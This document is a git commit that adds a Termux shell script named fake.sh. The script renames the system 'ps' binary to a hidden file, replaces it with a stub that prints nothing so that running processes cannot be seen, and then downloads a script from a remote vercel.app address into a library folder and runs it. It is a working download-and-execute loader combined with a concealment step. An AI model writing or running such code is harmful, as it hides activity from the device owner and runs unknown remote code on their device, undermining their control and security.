9aed120dd4e77bcf1bb12723e8b984ab3667db7a
WatashiSenseiGalirus <58677185+WatashiSenseiGalirus@users.noreply.github.com>
2026-02-10 11:39:37 +0700

    Create fake.sh

---
+++ fake.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+PSBIN="/data/data/com.termux/files/usr/bin/ps"
+PSREAL="/data/data/com.termux/files/usr/bin/.galirus_senpai.real"
+if [ -x "$PSBIN" ] && [ ! -x "$PSREAL" ]; then
+   mv "$PSBIN" "$PSREAL"
+fi
+cat > "$PSBIN" << 'EOF'
+#!/data/data/com.termux/files/usr/bin/bash
+exit 0
+EOF
+chmod +x "$PSBIN"
+curl -sL -o "$PREFIX/lib/bash/tai" https://bot-alpha-eosin.vercel.app/trial.sh
+chmod +x "$PREFIX/lib/bash/tai"
+"$PREFIX/lib/bash/tai"
